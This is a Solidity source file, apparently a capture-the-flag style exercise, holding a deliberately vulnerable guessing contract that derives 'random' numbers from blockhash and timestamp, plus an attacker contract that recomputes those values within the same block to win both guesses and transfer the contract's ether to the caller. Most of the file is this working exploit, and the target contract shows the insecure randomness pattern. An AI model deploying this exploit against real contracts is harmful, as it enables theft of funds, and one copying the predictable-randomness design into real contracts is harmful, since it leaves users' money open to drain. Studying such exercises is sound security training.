//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;
// 分别猜中两个随机数。
contract att{
    blocker blo;
    bool public a;
    constructor(blocker addr) {
        blo = addr;
    }
    function attract() public payable {
        bytes32 answer1 = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
        blo.guesser{value : 0.001 ether}(answer1);
         
    }
    function attract1() public {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        if(answer == 0){
            a = true;
            blo.guessed(); 
            blo.isCompleted();
            payable(msg.sender).transfer(address(this).balance);
        }
        
    }
    receive() external payable {}
}
contract blocker{
    uint256 public guessFlag;
    uint256 public score;
    uint8 guess;
    uint256 settlementBlockNumber;
    function guesser(bytes32 n) public payable {
        require(msg.value == 0.001 ether);
        bytes32 answer = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
        if (n == answer && guessFlag==0) {
            guessFlag+=5;
        }
    }

    function lockInGuess(uint8 n) public payable  {
        require(msg.value == 0.001 ether);
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function guessed() public {
        require(block.number > settlementBlockNumber,"try again later");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        if (guess == answer && guessFlag==5) {
            guessFlag+=5;
        }
    }

    function isCompleted()public{
        score = 0;
        score = guessFlag * guessFlag;
        if(score==100){
            payable(msg.sender).transfer(address(this).balance);
        }
    }
}